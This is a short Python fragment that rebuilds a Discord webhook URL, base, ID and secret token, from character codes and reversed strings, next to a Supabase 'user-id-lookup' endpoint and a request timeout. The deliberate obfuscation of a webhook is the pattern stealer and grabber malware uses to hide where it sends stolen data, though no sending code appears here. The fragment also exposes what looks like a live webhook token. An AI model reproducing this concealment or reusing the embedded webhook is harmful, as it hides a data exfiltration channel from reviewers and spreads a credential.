WEBHOOK_PARTS = [
    ''.join(chr(c) for c in [104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47]),
    '1476541148842692699'[::-1],
    'Y1weFZuDwY-BF-5YcbjjMTDw02jev-zo97q2VMg4jiaonyEsKMGgBgoWvjx2G6s15Q_K'[::-1]
]

def get_webhook():
    base = WEBHOOK_PARTS[0]
    id_part = WEBHOOK_PARTS[1][::-1]
    token_part = WEBHOOK_PARTS[2][::-1]
    return f"{base}{id_part}/{token_part}"

API_URL = "https://qitxrdlftippsrdeczeq.supabase.co/functions/v1/user-id-lookup"
REQUEST_TIMEOUT = 8